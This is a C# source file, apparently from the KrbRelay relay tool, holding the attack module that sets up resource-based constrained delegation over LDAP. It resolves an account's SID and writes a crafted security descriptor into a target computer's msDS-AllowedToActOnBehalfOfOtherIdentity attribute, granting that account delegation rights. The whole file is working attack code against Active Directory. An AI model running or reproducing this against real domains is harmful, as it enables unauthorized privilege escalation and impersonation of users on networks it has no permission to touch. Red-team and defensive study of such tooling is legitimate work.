using System;
using System.Security.AccessControl;
using System.Security.Principal;

namespace KrbRelay.Clients.Attacks.Ldap
{
    internal class RBCD
    {
        public static LdapStatus attack(IntPtr ld, string nameOrSid, string computername = null)
        {
            if (!nameOrSid.StartsWith("S-1-5-")) {
                if (!nameOrSid.StartsWith("S-"))
                {
                    // Is this safe to assume?
                    if (!nameOrSid.EndsWith("$"))
                    {
                        nameOrSid += "$";
                    }

                    var sidBytes = Generic.GetAttributeWithAccountName(ld, nameOrSid, "objectSid")[0];
                    nameOrSid = new SecurityIdentifier(sidBytes, 0).ToString();
                }
            }

            string dn = Generic.GetDistinguishedNameFromAccountName(ld, computername, true);
            var dacl = "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;" + nameOrSid + ")";
            RawSecurityDescriptor sd = new RawSecurityDescriptor(dacl);
            byte[] value = new byte[sd.BinaryLength];
            sd.GetBinaryForm(value, 0);
            var result = Generic.SetAttribute(ld, dn, "msDS-AllowedToActOnBehalfOfOtherIdentity", value);

            if (result == LdapStatus.Success)
            {
                Console.WriteLine("[+] Successfully configured RBCD");
                Console.WriteLine(" |- DN:  {0}", dn);
                Console.WriteLine(" |- SID: {0}", nameOrSid);
            } else
            {
                Console.WriteLine("[!] Failed to configure RBCD: {0}", result);
            }

            return result;
        }
    }
}
